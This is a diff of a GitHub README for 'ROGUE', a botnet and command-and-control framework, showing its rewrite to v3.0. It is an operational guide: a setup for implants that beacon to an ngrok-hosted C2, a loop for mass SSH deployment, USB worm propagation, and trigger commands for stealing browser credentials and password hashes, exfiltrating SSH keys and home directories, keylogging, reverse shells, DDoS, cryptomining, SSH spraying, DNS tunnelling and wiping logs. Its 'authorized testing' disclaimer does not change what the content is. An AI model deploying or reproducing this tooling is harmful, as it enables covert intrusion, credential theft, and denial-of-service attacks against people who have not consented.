@@ -1,383 +1,652 @@
-# ROGUE - Encrypted Botnet Framework
+# ROGUE - Botnet w/ integrated c2 v3.0
 
 ![rogue banner](https://github.com/user-attachments/assets/7dd2e5a3-398a-4487-a46b-541673b0f3b3)
 
 ## Overview
 
-ROGUE is a sophisticated encrypted command-and-control framework designed for authorized security testing and research. It features AES-256 encryption, web-based administration, Discord fallback channels, and autonomous propagation capabilities.
+ROGUE v3.0 is a comprehensive encrypted command-and-control framework designed for authorized penetration testing, red team operations, and incident response training. Featuring AES-256 encryption, web-based administration, and an extensive payload arsenal, ROGUE provides professional-grade capabilities for security testing.
 
 ---
 
-## Features
+##  What's New in v3.0
 
-### Core Capabilities
-- **AES-256 Encrypted Communications** - Secure command and exfiltration channels
-- **Web-Based Administration** - Full-featured GUI control panel
-- **Dual C2 Channels** - HTTPS primary with Discord fallback
-- **Ngrok HTTPS Tunneling** - Zero-port-forwarding deployment
-- **Peer-to-Peer Bot Communication** - Bot coordination when C2 is offline
-- **Process Stealth** - Masquerades as system daemons
+### **Enhanced Payload Suite**
+- **12+ Professional Payloads** for reconnaissance, privilege escalation, and data collection
+- **Compound Operations** for automated red team workflows
+- **Advanced Stealth** with improved persistence and evasion techniques
 
-### Payload Arsenal
-- **PolyRoot Persistence** - Privilege escalation and SUID backdoors
-- **DDoS Module** - Multi-vector attack capabilities
-- **Cryptocurrency Miner** - Silent mining operations
-- **Credential Dumper** - Automated credential collection
-- **File Exfiltration** - Encrypted data extraction
+### **Modern Web Interface**
+- **Tabbed Interface** for organized operation management
+- **Category-Based Operations** (Recon, Persistence, Collection, etc.)
+- **Real-time Results Viewer** with command history
+- **Payload Management System** with direct load/run capabilities
 
-### Propagation & Persistence
-- **USB Worm Logic** - Auto-infects removable drives
-- **Bashrc Persistence** - Survives reboots
-- **Hidden Execution** - Runs from `.cache/.rogue/` directory
-- **Cross-Platform Ready** - Linux/Raspberry Pi focused
+### **Professional Features**
+- **Implant Self-Update** - Update implants from C2
+- **Health Monitoring** - Real-time implant status checking
+- **Forensic Cleanup** - Automated log cleaning and trace removal
+- **DNS Tunneling** - Covert C2 channel via DNS queries
 
 ---
 
-## Installation
+## Installation & Setup
 
-### Clone Repository
+### **System Requirements**
+- Python 3.8+
+- Linux/Unix-based systems (primary focus)
+- 2GB RAM minimum, 4GB recommended
+- Internet connection for ngrok tunneling
+
+### **Clone Repository**
 ```bash
 git clone https://github.com/ekomsSavior/rogue.git
 cd rogue
 ```
 
-### Install Dependencies
+### **Install Dependencies**
 ```bash
+# Core dependencies
 sudo apt update
-sudo apt install python3 python3-pip python3-dev -y
-pip3 install pycryptodome flask requests
+sudo apt install python3 python3-pip python3-dev python3-venv -y
+
+# Create virtual environment (recommended)
+python3 -m venv venv
+source venv/bin/activate
+
+# Install Python packages
+pip3 install pycryptodome flask requests psutil setproctitle netifaces
+
+# Optional dependencies for enhanced payloads
+pip3 install paramiko pynput pyautogui python-nmap secretstorage
 ```
 
-### Ngrok Setup
+### **Ngrok Setup**
 ```bash
+# Download and install ngrok
 wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
 tar -xvzf ngrok-v3-stable-linux-amd64.tgz
 sudo mv ngrok /usr/local/bin/
+
+# Set up authentication
+ngrok config add-authtoken YOUR_NGROK_AUTH_TOKEN
 ```
-### set up NGROK auth token
-```bash
-ngrok config add-authtoken YOUR_AUTH_TOKEN
-```
+
 ---
 
-## Quick Start
+## 🏁 Quick Start Guide
 
-### 1. Start C2 Server 
-
-( IMPORTANT: For optimal operation, run the C2 server on a separate machine or VPS from your implants)
-
+### **1. Start C2 Server** (Control Center)
 ```bash
 python3 rogue_c2.py
 ```
 
-![IMG_0827](https://github.com/user-attachments/assets/b7c4a6a9-f920-427b-8860-1de9fb3368e9)
+**Expected Output:**
+```
+============================================================
+ ROGUE C2 SERVER - Complete Command & Control
+============================================================
+[✓] Exfil listener started on port 9091
+[✓] Reverse shell listener started on port 9001
+[*] Starting ngrok tunnel...
+[✓] C2 SERVER IS LIVE!
+[NGROK] C2 URL: https://your-subdomain.ngrok-free.dev
+[NGROK] Hostname: your-subdomain.ngrok-free.dev
+[NGROK] Payloads: https://your-subdomain.ngrok-free.dev/payloads/
+[ADMIN] Web Panel: http://localhost:4444/admin
+============================================================
+```
 
-
-The server will:
-- Start ngrok HTTPS tunnel
-- Launch Flask C2 on port 4444
-- Start exfiltration listener (port 9090)
-- Start reverse shell listener (port 9001)
-- Display admin panel at `http://localhost:4444/admin`
-
-### 2. Configure Implant
-Edit `rogue_implant.py` with your ngrok URL:
+### **2. Configure Implant**
+Edit `rogue_implant.py` with your C2 details:
 ```python
 C2_HOST = 'your-ngrok-subdomain.ngrok-free.dev'
+C2_PORT = 4444
 PAYLOAD_REPO = "https://your-ngrok-subdomain.ngrok-free.dev/payloads/"
 ```
 
-### 3. Deploy Implant
+### **3. Deploy Implants**
 
-Run on target system:
+**Manual Deployment:**
 ```bash
 python3 rogue_implant.py
 ```
 
-![IMG_0828](https://github.com/user-attachments/assets/e280f8e8-a198-4f9e-85fc-47aad4813b1a)
+**Mass Deployment (SSH):**
+```bash
+for ip in $(cat targets.txt); do
+    scp rogue_implant.py user@$ip:/tmp/ && \
+    ssh user@$ip "cd /tmp && python3 rogue_implant.py &"
+done
+```
 
+**USB Worm Propagation:**
+- Insert USB drive into infected system
+- Implant auto-copies to USB as `.rogue_worm/`
+- Plug USB into new system to infect
 
 ---
 
-## Web GUI Administration
+##  Web Interface Guide
 
-
-
-### Accessing the Control Panel
-After starting the C2 server, ACCESS THE WEB INTERFACE at:
-
+### **Access Control Panel**
 ```
 http://localhost:4444/admin
 ```
 
-![IMG_0824(1)](https://github.com/user-attachments/assets/ce6b60e8-294c-444b-95b0-130379f7a96b)
+### **Interface Layout**
 
+#### **Tab 1: Active Bots**
+- View connected implants with real-time status
+- Send commands to individual bots
+- Monitor command results and pending queues
+- Color-coded status indicators (green = active)
 
-### GUI Features
-- **Real-time Bot Monitoring** - View all connected implants
-- **Command Queue Management** - Send commands to individual or all bots
-- **Result History** - View command outputs and exfiltration results
-- **Quick Command Buttons** - Common operations with one click
-- **Server Status Dashboard** - Monitor C2 server health and connections
+#### **Tab 2: Operations**
+**Reconnaissance & Intelligence**
+```
+trigger_sysrecon        # Comprehensive system reconnaissance
+trigger_linpeas         # Linux privilege escalation checker
+trigger_hashdump        # Password hash extraction
+trigger_browsersteal    # Browser credential theft
+trigger_network_scan    # Network host discovery
+```
 
-### Using the Web Interface
-1. **View Connected Bots** - See all active implants with their IP addresses and last check-in times
-2. **Send Commands** - Use the command forms to execute shell commands or trigger payloads
-3. **Monitor Results** - View command outputs in the results section
-4. **Manage Payloads** - Access payload repository from the server status section
+**Advanced Operations**
+```
+trigger_full_recon      # Complete reconnaissance suite
+trigger_harvest_all     # Comprehensive data collection
+trigger_clean_sweep     # Forensic cleanup & restart
+```
 
-![IMG_0822](https://github.com/user-attachments/assets/55170877-90c7-4c20-9dce-771d9a24fb85)
+**Persistence & Stealth**
+```
+trigger_stealthinject   # PolyRoot persistence installation
+trigger_persistence_setup # Additional persistence mechanisms
+trigger_defense_evasion  # Anti-forensic techniques
+trigger_logclean        # System log cleaning
+trigger_logclean all    # Aggressive log cleaning
+```
+
+**Monitoring & Collection**
+```
+trigger_keylogger       # Start keystroke logging
+trigger_keylogger stop  # Stop keylogger
+trigger_screenshot      # Periodic screen capture
+trigger_screenshot stop # Stop screenshot capture
+reverse_shell          # Interactive reverse shell
+```
+
+**Lateral Movement**
+```
+trigger_lateral_move    # Automated lateral movement
+trigger_autodeploy      # Network auto-deployment
+trigger_sshspray        # SSH credential spraying
+trigger_dnstunnel       # DNS tunneling C2
+trigger_dnstunnel stop  # Stop DNS tunnel
+```
+
+**DDoS & Cryptomining**
+```
+trigger_ddos <target> <port> <time>  # DDoS attack
+trigger_mine            # Start cryptocurrency miner
+trigger_stopmine        # Stop miner
+```
+
+**Implant Management**
+```
+trigger_status          # Check implant health
+trigger_self_update     # Update implant from C2
+trigger_help           # Show available commands
+trigger_forensics_check # Check for forensic artifacts
+```
+
+**Data Exfiltration**
+```
+trigger_exfil /etc      # Exfiltrate system configuration
+trigger_exfil /home     # Exfiltrate user directories
+trigger_exfil ~/.ssh    # Exfiltrate SSH keys
+trigger_dumpcreds       # Dump credentials from common locations
+```
+
+#### **Tab 3: Payloads**
+- Browse available payloads
+- Direct load/run buttons
+- Payload descriptions and categories
+- Organized by operation type
+
+#### **Tab 4: Results**
+- Command execution history
+- Timestamped results
+- Filter by bot ID
+- Export capabilities
+
+#### **Tab 5: Server Status**
+- Server uptime
+- Ngrok tunnel status
+- Active bot count
+- System resource monitoring
 
 ---
 
-## Encryption & Security
+##  Payload Reference
 
-### AES-256 Encryption
-All C2 communications are encrypted with AES-256 in EAX mode. Separate keys are used for command channels and exfiltration data. The system includes SSL/TLS bypass for ngrok compatibility.
+### **Core Payloads**
 
-### Stealth Features
-- Process name masquerading (appears as `systemd-journald`)
-- Hidden directory operation (`~/.cache/.rogue/`)
-- Discord fallback for NAT/Firewall bypass scenarios
-- P2P bot communication as backup channel
+#### **System Reconnaissance** (`sysrecon.py`)
+```bash
+trigger_sysrecon
+```
+**Collects:**
+- System hardware information
+- Network configuration
+- User accounts and privileges
+- Running processes and services
+- Installed software inventory
+- Security defenses status
+
+#### **Privilege Escalation** (`linpeas_light.py`)
+```bash
+trigger_linpeas
+```
+**Checks:**
+- Sudo privileges and misconfigurations
+- SUID/SGID binaries
+- World-writable files and directories
+- Cron job vulnerabilities
+- Kernel exploits
+- Linux capabilities
+
+#### **Credential Access** (`hashdump.py`)
+```bash
+trigger_hashdump
+```
+**Extracts:**
+- Linux password hashes (/etc/shadow)
+- Windows SAM hashes (if available)
+- SSH private/public keys
+- Browser saved credentials
+- Memory credential artifacts
+
+#### **Browser Data Theft** (`browserstealer.py`)
+```bash
+trigger_browsersteal
+```
+**Targets:**
+- Firefox: logins, cookies, history, bookmarks
+- Chrome/Chromium: saved passwords, autofill data
+- Edge/Brave: credentials and browsing data
+- Safari: keychain and browsing history
+
+#### **Monitoring Payloads**
+```bash
+trigger_keylogger       # Real-time keystroke logging
+trigger_screenshot      # Periodic screen capture (every 60s)
+```
+
+#### **Defense Evasion** (`logcleaner.py`)
+```bash
+trigger_logclean        # Clean implant traces
+trigger_logclean all    # Aggressive system log cleaning
+```
+
+#### **Lateral Movement** (`sshspray.py`)
+```bash
+trigger_sshspray <target> <userlist> <passlist>
+```
+**Features:**
+- Multi-threaded SSH authentication attempts
+- Common credential dictionary
+- Success/failure reporting
+- Session persistence
+
+#### **Covert C2** (`dnstunnel.py`)
+```bash
+trigger_dnstunnel       # Start DNS tunneling
+```
+**Uses DNS queries for:**
+- Command delivery
+- Data exfiltration
+- C2 communication bypassing firewalls
 
 ---
 
-## Payload Modules
+##  Advanced Usage
 
-### PolyRoot Persistence
+### **Compound Operations**
+
+#### **Full Reconnaissance Suite**
 ```bash
-# Trigger from C2
-trigger_stealthinject
-
-# Manual execution
-python3 payloads/polyloader.py
+trigger_full_recon
 ```
-- Attempts privilege escalation via SUID binaries
-- Drops persistent backdoor
-- Auto-connects reverse shell to C2
+**Executes sequentially:**
+1. System reconnaissance
+2. Privilege escalation checks
+3. Password hash extraction
+4. Network scanning
 
-### DDoS Module
+#### **Complete Data Harvest**
 ```bash
-# C2 Command via Web GUI
-trigger_ddos <target_ip> <port> <duration>
-
-# Manual execution
-python3 payloads/ddos.py 192.168.1.100 80 300 http
+trigger_harvest_all
 ```
-**Attack Modes:** `http`, `tls`, `udp`, `tcp`, `slowpost`, `combo`
+**Collects:**
+1. Browser credentials and data
+2. System password hashes
+3. SSH keys and certificates
+4. Configuration files
+5. User documents and downloads
 
-### Credential Exfiltration
+#### **Clean Sweep Operation**
+```bash
+trigger_clean_sweep
+```
+**Performs:**
+1. System log cleaning
+2. Defense evasion techniques
+3. Implant restart in stealth mode
+4. Forensic artifact removal
+
+### **Implant Management**
+
+#### **Health Checking**
+```bash
+trigger_status
+```
+**Reports:**
+- Implant ID and C2 connectivity
+- System resource usage
+- Process stealth status
+- Available payloads
+- Uptime and beacon count
+
+#### **Remote Update**
+```bash
+trigger_self_update
+```
+- Downloads latest implant from C2
+- Replaces current version
+- Maintains persistence
+- Preserves configuration
+
+### **Data Exfiltration**
+
+#### **Targeted Exfiltration**
+```bash
+trigger_exfil /path/to/target
+```
+**Common targets:**
+- `/etc` - System configuration
+- `/home` - User directories
+- `/var/log` - System logs
+- `~/.ssh` - SSH keys and configs
+- `~/Documents` - User documents
+
+#### **Credential Dumping**
 ```bash
 trigger_dumpcreds
 ```
-Collects system credentials including:
-- `/etc/passwd`, `/etc/shadow`
-- SSH keys from `~/.ssh/`
-- Browser credentials
-- Wallet files
-
-### File Exfiltration
-```bash
-trigger_exfil /path/to/folder
-trigger_exfil default  # Common directories
-trigger_exfil deep     # Deep system scan
-```
+**Targets default locations:**
+- `~/Documents`
+- `~/Downloads`
+- `~/Pictures`
+- `~/Desktop`
+- `~/.ssh`
 
 ---
 
-## USB Worm Propagation
+##  Stealth & Persistence
 
-### How It Works
-When `rogue_implant.py` detects a USB drive:
-1. Monitors `/media/`, `/run/media/`, `/mnt/` for new mounts
-2. Copies itself to USB as hidden payload
-3. Creates autorun scripts (`.bash_login`)
-4. Infects new systems when USB is plugged in
+### **Silent Operation Modes**
 
-### Infected USB Structure
+**Manual Execution** (Visible for debugging):
+```bash
+python3 rogue_implant.py
+# Shows beacon activity and command execution
 ```
-USB Drive/
-├── .rogue_worm/          # Hidden worm directory
-│   ├── rogue_implant.py  # Main implant
-│   └── .bash_login       # Auto-execute script
-└── readme.txt           # Decoy file
+
+**Persistence Mode** (Completely silent):
+- Auto-starts from `.bashrc` on login
+- No terminal output
+- Output redirected to `~/.cache/.rogue/.implant.log`
+- Process masquerades as `systemd-journald`
+
+### **Persistence Mechanisms**
+
+1. **Bashrc Injection** - Primary persistence
+2. **Systemd Service** - Service-based persistence (optional)
+3. **Cron Jobs** - Scheduled execution
+4. **USB Worm** - Removable drive propagation
+5. **PolyRoot** - Privileged persistence via SUID
+
+### **Defense Evasion**
+
+**Log Cleaning:**
+```bash
+trigger_logclean        # Clean implant-specific logs
+trigger_logclean all    # Clean all suspicious entries
 ```
+
+**Process Hiding:**
+- Masquerades as `systemd-journald`
+- Randomizes check-in intervals
+- Uses encrypted communications
+- Implements P2P fallback channels
 
 ---
 
-## Command Reference
+##  C2 Communication
 
-### Basic Commands (via Web GUI)
-```bash
-whoami                    # System information
-ls -la /home              # List user directories
-ip a                      # Network configuration
-ps aux                    # Running processes
-```
+### **Primary Channel (HTTPS)**
+- Encrypted AES-256 communication
+- 30-second beacon interval
+- Automatic reconnection
+- Command queuing system
 
-### Payload Management
-```bash
-load_payload polyloader.py    # Download payload
-run_payload polyloader.py     # Execute payload
-trigger_mine                   # Start crypto miner
-trigger_stopmine              # Stop miner
-```
+### **Fallback Channels**
 
-### Advanced Operations
-```bash
-reverse_shell                 # Initiate reverse shell (port 9001)
-trigger_dumpcreds             # Dump and exfil credentials
-trigger_exfil /etc            # Exfiltrate specific directory
-trigger_ddos 1.2.3.4 80 60   # DDoS attack (60 seconds)
-```
+**Discord:**
+- Commands via Discord channel messages
+- Results via webhook
+- Useful when HTTPS blocked
 
----
+**P2P Network:**
+- Bot-to-bot communication
+- UDP broadcast on ports 7008-7011
+- Command relay capability
 
-## Discord C2 Setup (Fallback Channel)
-
-### Configuration
-Edit the Discord settings in `rogue_implant.py`:
-```python
-DISCORD_COMMAND_URL = "https://discord.com/api/v10/channels/YOUR_CHANNEL_ID/messages?limit=1"
-DISCORD_WEBHOOK = "https://discord.com/api/webhooks/YOUR_WEBHOOK_URL"
-BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
-```
-
-### Discord Bot Setup
-1. Visit Discord Developer Portal and create new application
-2. Add bot with Message Content Intent enabled
-3. Copy bot token and channel ID
-4. Create webhook in your Discord channel
-
-### How Discord Fallback Works
-- Implant checks Discord channel every 30 seconds for commands
-- Commands posted in Discord are executed on all implants
-- Results are encrypted and sent back via webhook
-- Provides C2 redundancy when primary HTTPS channel is unavailable
+**DNS Tunneling:**
+- Covert channel via DNS queries
+- Bypasses network restrictions
+- Slower but highly stealthy
 
 ---
 
----
+##  Emergency Procedures
 
-## Emergency Removal Guide just in case 
-
-### If You Need to Remove Rogue From a System
-
-#### One-Liner Emergency Remove & Verify:
+### **Implant Removal from Target**
 ```bash
+# Quick removal (recommended)
 sudo pkill -9 -f rogue && sudo rm -rf ~/.cache/.rogue && \
 sed -i '/ROGUE\|rogue_agent\|systemd-journald/d' ~/.bashrc ~/.profile ~/.bash_profile && \
-echo "✓ Removed" && sleep 2 && ps aux | grep -E "rogue|\.rogue" | grep -v grep || echo "✓ Clean!"
+echo "✓ Rogue removed"
+
+# Verification
+ps aux | grep -E "rogue|\.rogue" | grep -v grep || echo "System clean"
+ls -la ~/.cache/.rogue/ 2>/dev/null || echo "No hidden directory"
 ```
 
-#### Quick Kill Command (Run as root or with sudo):
+### **C2 Server Shutdown**
 ```bash
-# Stop all Rogue processes and remove persistence
-sudo pkill -9 -f "rogue_implant.py" && \
-sudo pkill -9 -f ".rogue_agent.py" && \
-sudo pkill -9 -f "systemd-journald" && \
-sed -i '/ROGUE_LAUNCHED/d; /rogue_agent.py/d; /systemd-journald/d' ~/.bashrc ~/.profile ~/.bash_profile && \
-echo "[+] Rogue processes terminated and persistence removed"
+# Graceful shutdown
+pkill -f "python3 rogue_c2.py"
+pkill -f "ngrok"
+rm -f exfil_*.zip exfil_*.bin
+
+# Clean restart
+./cleanup.sh  # Optional cleanup script
 ```
 
-#### Verify Removal:
+### **Forensic Cleanup**
 ```bash
-# Check if any Rogue processes are still running
-ps aux | grep -E "(rogue|\.rogue_agent|rogue_implant)" | grep -v grep
-
-# Check for hidden directory
-ls -la ~/.cache/.rogue/ 2>/dev/null && echo "WARNING: Hidden directory still exists!"
-
-# Check persistence files
-grep -n "ROGUE\|rogue_agent\|systemd-journald" ~/.bashrc ~/.profile ~/.bash_profile 2>/dev/null
+# Remove all traces
+trigger_clean_sweep        # From C2 panel
+# OR
+trigger_logclean all      # Aggressive log cleaning
 ```
----
----
-
-## Targeting & Deployment
-
-### Linux Systems
-```bash
-# Single target deployment
-scp rogue_implant.py user@target:/tmp/
-ssh user@target "python3 /tmp/rogue_implant.py"
-
-# Mass deployment via SSH
-for ip in $(cat targets.txt); do
-    scp rogue_implant.py user@$ip:/tmp/
-    ssh user@$ip "python3 /tmp/rogue_implant.py &"
-done
-```
-
-### Persistence Methods
-1. **Bashrc Injection** - Auto-starts on user login
-2. **Systemd Service** - Runs as background service (planned)
-3. **Cron Jobs** - Scheduled execution
-4. **SUID Backdoor** - Privileged persistence via polyroot
 
 ---
 
-## Troubleshooting
+##  Troubleshooting
 
-### Common Issues
+### **Common Issues & Solutions**
 
-**Ngrok 404 Errors**
+**Ngrok Connection Issues:**
 ```bash
-# Ensure ngrok is running
-ps aux | grep ngrok
+# Check ngrok status
+curl http://localhost:4040/api/tunnels
 
 # Restart ngrok
 pkill ngrok
 ngrok http 4444
+sleep 5
 ```
 
-**Implant Not Connecting**
+**Implant Not Connecting:**
 ```bash
-# Check C2_HOST in implant matches ngrok URL
-# Verify payloads directory exists
-ls payloads/
+# Test C2 connectivity from target
+curl -k https://your-c2.ngrok-free.dev
 
-# Test payload delivery
-curl https://your-ngrok.ngrok-free.dev/payloads/polyloader.py
+# Check implant logs
+cat ~/.cache/.rogue/.implant.log 2>/dev/null
+
+# Verify payload delivery
+curl -k https://your-c2.ngrok-free.dev/payloads/test.py
 ```
 
-**Web GUI Not Accessible**
+**Web Interface Issues:**
 ```bash
-# Check Flask is running on port 4444
+# Check Flask is running
 netstat -tlnp | grep 4444
 
-# Verify no firewall blocking
-sudo ufw status
+# Check for port conflicts
+sudo lsof -i :4444
+
+# Restart C2 server
+pkill -f "python3 rogue_c2.py"
+python3 rogue_c2.py
 ```
 
-### Log Locations
-- **C2 Logs**: Console output + Flask logs
-- **Implant Logs**: Console output on target systems
-- **Exfil Data**: `exfil_dec_*.zip` files in C2 directory
-- **Payloads**: `~/.cache/.rogue/` on infected systems
+**Payload Execution Errors:**
+```bash
+# Check dependencies
+pip3 install psutil netifaces paramiko pynput
+
+# Verify Python version
+python3 --version
+
+# Check file permissions
+chmod +x payloads/*.py
+```
+
+### **Log Files & Diagnostics**
+
+**C2 Server Logs:**
+- Console output during startup
+- Flask application logs
+- Exfiltration processing logs
+
+**Implant Logs:**
+- `~/.cache/.rogue/.implant.log` (silent mode)
+- Console output (manual mode)
+- Beacon activity and command results
+
+**Network Diagnostics:**
+```bash
+# Test C2 connectivity
+ping your-c2.ngrok-free.dev
+nc -zv your-c2.ngrok-free.dev 443
+curl -k -I https://your-c2.ngrok-free.dev
+
+# Test exfiltration port
+nc -zv your-c2.ngrok-free.dev 9091
+```
 
 ---
 
-## Legal & Ethical Use
+##  Command Quick Reference
 
-### DISCLAIMER
-This tool is for:
-- Educational purposes only
-- Authorized security testing
-- Research and development
-- Penetration testing with explicit permission
+### **Essential Commands**
+```bash
+# System Information
+whoami
+uname -a
+ip a
+ps aux
 
-### LEGAL REQUIREMENTS
-1. Only test on systems you own or have written permission to test
-2. Comply with all applicable laws and regulations
-3. Do not use for malicious purposes
-4. Assume full responsibility for your actions
+# File Operations
+ls -la /home
+find / -type f -name "*.conf" 2>/dev/null | head -20
+cat /etc/passwd
+
+# Network Operations
+netstat -tunap
+ss -tunap
+arp -a
+```
+
+### **Trigger Commands (C2 Panel)**
+```bash
+# Reconnaissance
+trigger_sysrecon
+trigger_linpeas
+trigger_hashdump
+trigger_browsersteal
+
+# Operations
+trigger_full_recon
+trigger_harvest_all
+trigger_clean_sweep
+
+# Persistence
+trigger_stealthinject
+trigger_persistence_setup
+trigger_defense_evasion
+
+# Monitoring
+trigger_keylogger
+trigger_screenshot
+reverse_shell
+
+# Management
+trigger_status
+trigger_self_update
+trigger_help
+```
+
+### **Payload Commands**
+```bash
+# Load and execute
+load_payload sysrecon.py
+run_payload sysrecon.py
+
+# Direct execution
+python3 ~/.cache/.rogue/sysrecon.py
+```
 
 ---
-  
-For educational purposes only. Use responsibly.
 
-<img width="1151" height="1360" alt="roguerogue" src="https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520" />
+##  License & Disclaimer
 
+### **License**
+This project is released for educational purposes only. Users assume all responsibility for legal compliance.
 
+### **Disclaimer**
+```
+THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
+The author assumes no liability for misuse or damage caused by this software.
+Users must obtain proper authorization before use.
+```
+
+![rogue](https://github.com/user-attachments/assets/d8c0e482-efa0-4f43-86dc-bf8e15505520)
+
+---
+*Last Updated: v3.0 | For authorized security testing only*
